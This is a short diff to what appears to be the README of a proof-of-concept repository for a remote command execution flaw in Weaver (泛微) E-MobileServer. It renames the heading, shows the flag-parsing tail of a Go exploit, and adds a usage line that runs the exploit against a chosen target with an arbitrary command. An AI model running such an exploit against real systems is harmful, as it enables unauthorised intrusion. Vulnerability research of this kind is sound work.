@@ -1,5 +1,5 @@
 
-## 泛微移动办公OA远程命令执行漏洞
+## 泛微E-MobileServer远程命令执行漏洞
 
 ## go语言 poc
 ```go
@@ -69,3 +69,5 @@ func getParam() (t, c string) {
         return hflag.GetString("target"), hflag.GetString("command")
 }
 ```
+## poc使用
+```go run poc.go -t http://目标  -c 执行命令```
